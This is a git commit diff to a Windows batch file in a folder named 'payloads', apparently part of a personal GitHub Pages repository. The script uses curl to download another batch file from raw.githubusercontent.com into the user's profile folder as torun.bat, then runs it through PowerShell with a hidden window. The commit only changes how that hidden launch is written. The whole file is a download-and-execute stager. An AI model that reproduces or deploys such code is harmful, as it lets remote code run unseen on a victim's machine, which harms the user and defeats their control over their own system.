f668841cb7407f17c5df04e5f16ddf07d90bf0fa
BigGreenHat14 <163580586+BigGreenHat14@users.noreply.github.com>
2026-03-15 13:21:12 -0500

    Update 3.bat

--- payloads/3.bat
+++ payloads/3.bat
@@ -1,2 +1,2 @@
 cmd /C "curl https://raw.githubusercontent.com/BigGreenHat14/biggreenhat14.github.io/refs/heads/main/payloads/3_main.bat > %USERPROFILE%\torun.bat"
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath \"$env:USERPROFILE\torun.bat\""
+powershell -WindowStyle Hidden -Command "& { $path = Join-Path $env:USERPROFILE 'torun.bat'; Start-Process -FilePath $path }"
